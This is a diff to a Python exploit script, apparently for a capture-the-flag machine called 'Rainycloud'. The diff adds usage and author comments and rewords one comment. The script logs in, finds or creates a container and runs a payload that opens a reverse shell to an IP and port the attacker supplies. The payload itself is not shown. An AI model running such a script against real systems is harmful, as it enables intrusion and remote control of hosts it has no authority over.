@@ -1,3 +1,7 @@
+# Usage: python3 rshell.py LocalIP local_port
+# waraning: before you run the script make sure your host file contain the target hostname
+# Author : @akhil0x8
+
 import requests
 import sys
 import re
@@ -46,7 +50,7 @@ Rainycloud = rshell(sys.argv[1],sys.argv[2])
 print("[+] Trying to login")
 Rainycloud.UserLogin()
 
-# If there is a container we fetch the container id and run the payload else script will create a container and run the payload for getting the reverse shell
+# If there is a container we fetch the container id and run the payload else script will create a new container and run the payload for getting the reverse shell
 ContainerID = Rainycloud.FindContainerId()
 
 if not ContainerID:
